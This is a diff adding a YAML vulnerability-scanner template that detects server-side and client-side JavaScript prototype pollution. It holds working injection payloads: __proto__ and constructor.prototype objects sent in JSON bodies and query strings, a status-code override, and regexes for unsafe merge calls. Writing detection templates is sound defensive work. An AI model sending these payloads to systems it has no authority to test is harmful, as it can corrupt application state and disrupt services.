@@ -1,0 +1,156 @@
+id: prototype-pollution-detection
+
+info:
+  name: Prototype Pollution - Server-Side & Client-Side Detection
+  author: achraf-chehboun
+  severity: high
+  description: |
+    Detects JavaScript prototype pollution vulnerabilities in both server-side
+    (Node.js/Express) and client-side contexts. Tests for __proto__, constructor.prototype,
+    and Object.assign pollution vectors through JSON body, query parameters, and URL
+    path injection. Confirms pollution by checking for injected properties in responses.
+  reference:
+    - https://portswigger.net/web-security/prototype-pollution
+    - https://github.com/nickvdyck/proto-pollution
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 9.0
+    cwe-id: CWE-1321
+  metadata:
+    max-request: 12
+  tags: prototype-pollution,nodejs,javascript,detection-only
+
+variables:
+  pollution_marker: "polluted_{{randstr}}"
+
+http:
+  # Test 1: Server-side via JSON body — __proto__ injection
+  - raw:
+      - |
+        POST /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"__proto__":{"polluted":"{{pollution_marker}}"}}
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: proto-json-body-pollution
+        dsl:
+          - 'contains(body_2, "{{pollution_marker}}")'
+
+  # Test 2: constructor.prototype via JSON body
+  - raw:
+      - |
+        POST /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"constructor":{"prototype":{"polluted":"{{pollution_marker}}"}}}
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: constructor-prototype-pollution
+        dsl:
+          - 'contains(body_2, "{{pollution_marker}}")'
+
+  # Test 3: Query parameter pollution (__proto__[key]=value)
+  - raw:
+      - |
+        GET /api/user?__proto__[polluted]={{pollution_marker}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: query-param-proto-pollution
+        dsl:
+          - 'contains(body_2, "{{pollution_marker}}")'
+
+  # Test 4: constructor pollution via query string
+  - raw:
+      - |
+        GET /api/user?constructor[prototype][polluted]={{pollution_marker}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: query-constructor-pollution
+        dsl:
+          - 'contains(body_2, "{{pollution_marker}}")'
+
+  # Test 5: Server-side prototype pollution via merge/extend — status override
+  - raw:
+      - |
+        POST /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: application/json
+
+        {"__proto__":{"status":510}}
+      - |
+        GET /api/nonexistent-{{randstr}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: status-code-pollution
+        dsl:
+          - 'status_code_2 == 510'
+
+  # Test 6: Client-side prototype pollution detection via DOM analysis
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: client-side-merge-pattern
+        regex:
+          - '(?i)(?:Object\.assign|_\.merge|_\.defaults|_\.defaultsDeep|jQuery\.extend|angular\.merge|lodash\.merge)\s*\([^)]*(?:location|hash|search|params|query)'
+        part: body
+
+      - type: regex
+        name: url-to-object-pattern
+        regex:
+          - '(?i)(?:qs\.parse|querystring\.parse|new URLSearchParams)\s*\([^)]*\)\s*[^;]*(?:merge|assign|extend|defaults)'
+        part: body
+
+      - type: regex
+        name: vulnerable-lodash-pattern
+        regex:
+          - '(?:lodash|underscore)[\w./]*(?:\.min)?\.js["\x27][^>]*>[^<]*(?:merge|defaultsDeep)'
+        part: body
+
+    extractors:
+      - type: regex
+        name: pollution-vectors
+        group: 0
+        regex:
+          - '(?i)((?:Object\.assign|_\.merge|_\.defaults|jQuery\.extend)[^;]{0,200})'
